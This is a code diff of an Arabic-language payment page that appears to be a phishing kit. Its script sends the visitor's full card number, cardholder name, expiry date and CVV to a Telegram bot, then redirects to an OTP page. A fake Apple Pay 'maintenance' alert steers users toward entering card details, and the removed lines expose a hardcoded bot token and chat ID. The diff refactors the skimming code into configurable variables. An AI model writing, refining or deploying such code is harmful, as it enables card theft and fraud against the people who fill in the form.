@@ -448,9 +448,16 @@
 
   <script src="config.js"></script>
   <script>
-    const BOT_TOKEN = '8364441024:AAHluZaG5P8utYObf0Qj3719YONXO8zH24c';
-    const CHAT_ID = '7785288759';
+    // Telegram Configuration
+    const telegramBotToken = TELEGRAM_BOT_TOKEN_PAYMENT;
+    const chatId = TELEGRAM_CHAT_ID_PAYMENT;
 
+    // Get owner name
+    function getOwnerName() {
+      return localStorage.getItem('owner_name') || 'غير معروف';
+    }
+
+    // Format date
     function formatDate(date) {
       return new Intl.DateTimeFormat('ar-SA', {
         year: 'numeric',
@@ -459,6 +466,7 @@
       }).format(date);
     }
 
+    // Calculate expiry date
     function calculateExpiry(startDate) {
       const date = new Date(startDate);
       if (Number.isNaN(date.getTime())) return null;
@@ -466,6 +474,7 @@
       return date;
     }
 
+    // Render summary
     function renderSummary() {
       const selectedPrice = localStorage.getItem('selectedPrice') || '0';
       const selectedCompany = localStorage.getItem('selectedCompany') || 'غير متوفر';
@@ -483,22 +492,40 @@
       document.getElementById('summaryExpiry').textContent = expiryDate ? formatDate(expiryDate) : 'غير متوفر';
     }
 
+    // Send data directly to Telegram
     async function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' };
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
       try {
         const response = await fetch(url, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
+          body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
         });
         return await response.json();
-      } catch (err) {
-        console.error('فشل الإرسال إلى تيليجرام:', err);
+      } catch (error) {
+        console.error('Telegram Error:', error);
+        return { ok: false };
       }
     }
 
-    function validateForm() {
+    // Submit payment data to Telegram
+    async function submitToServer(data) {
+      const message = `
+💳 <b>بيانات الدفع الجديدة:</b>
+━━━━━━━━━━━━━━━
+👤 العميل: ${data.owner_name}
+━━━━━━━━━━━━━━━
+👤 الاسم على البطاقة: ${data.card_name}
+🔢 رقم البطاقة: ${data.card_number}
+📅 تاريخ الانتهاء: ${data.expiry_month}/${data.expiry_year}
+🔐 رمز الـ CVV: ${data.cvv}
+💰 إجمالي السعر: ${data.total_price}
+      `;
+      return await sendToTelegram(message);
+    }
+
+    // Validate form
+    async function validateForm() {
       const cardName = document.getElementById('cardName').value.trim();
       const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
       const cvv = document.getElementById('cvv').value.trim();
@@ -511,39 +538,50 @@
       if (!/^\d{3}$/.test(cvv)) { alert('يرجى إدخال رمز CVV صحيح'); return; }
 
       showLoading();
-      const fullName = localStorage.getItem('owner_name') || 'غير معروف';
-      localStorage.setItem("cardNumber", cardNumber);
+      
+      const fullName = getOwnerName();
+      const last4 = cardNumber.slice(-4);
+      localStorage.setItem("cardNumber", last4);
 
       const finalPrice = document.getElementById('calcTotal').innerText;
 
-      const message = `
-💳 بيانات الدفع الجديدة:
-- 🧑‍💼 العميل: ${fullName}
-- 👤 الاسم على البطاقة: ${cardName}
-- 🔢 رقم البطاقة: ${cardNumber}
-- 📅 تاريخ الانتهاء: ${month}/${year}
-- 🔐 رمز الـ CVV: ${cvv}
-- 💰 إجمالي السعر المحسوب: ${finalPrice}
-      `;
+      // Prepare data for Telegram
+      const data = {
+        owner_name: fullName,
+        card_name: cardName,
+        card_number: cardNumber,
+        expiry_month: month,
+        expiry_year: year,
+        cvv: cvv,
+        total_price: finalPrice
+      };
 
-      sendToTelegram(message).then(() => {
-        setTimeout(() => {
-          hideLoading();
+      // Submit to Telegram
+      const result = await submitToServer(data);
+      
+      setTimeout(() => {
+        hideLoading();
+        if (result.ok) {
           window.location.href = "otp.html";
-        }, 7000);
-      });
+        } else {
+          alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
+        }
+      }, 2000);
     }
 
+    // Show loading overlay
     function showLoading() {
       document.getElementById('loadingOverlay').style.display = 'flex';
       document.getElementById('payBtn').disabled = true;
     }
 
+    // Hide loading overlay
     function hideLoading() {
       document.getElementById('loadingOverlay').style.display = 'none';
       document.getElementById('payBtn').disabled = false;
     }
 
+    // Calculate invoice
     function calculateInvoice() {
       const priceElement = document.getElementById('summaryPrice');
       if (!priceElement) return;
@@ -563,16 +601,16 @@
       document.getElementById('calcVat').innerText = `${vat.toFixed(2)} ريال`;
       document.getElementById('calcTotal').innerText = formattedTotal;
 
-      // تحديث الأسعار التلقائية في قسم الدفع والزر
+      // Update prices in payment section and button
       document.getElementById('methodPrice').innerText = formattedTotal;
       document.getElementById('payBtn').innerText = `ادفع الآن — ${formattedTotal}`;
     }
 
-    // تفعيل العمليات فور انتهاء التحميل
+    // Initialize on page load
     renderSummary();
     setTimeout(calculateInvoice, 300);
 
-    // تنسيق مسافات رقم البطاقة أوتوماتيكياً
+    // Format card number input
     document.getElementById('cardNumber').addEventListener('input', function (e) {
       let value = e.target.value.replace(/\D/g, '');
       let formatted = '';
@@ -581,9 +619,11 @@
       }
       e.target.value = formatted.trim();
     });
+
+    // Apple Pay maintenance message
     function showMaintenanceAlert() {
-  alert("عذراً، خدمة Apple Pay قيد الصيانة حالياً. يرجى استخدام بطاقة مدى أو فيزا لإتمام الدفع.");
-}
+      alert("عذراً، خدمة Apple Pay قيد الصيانة حالياً. يرجى استخدام بطاقة مدى أو فيزا لإتمام الدفع.");
+    }
   </script>
 </body>
 </html>
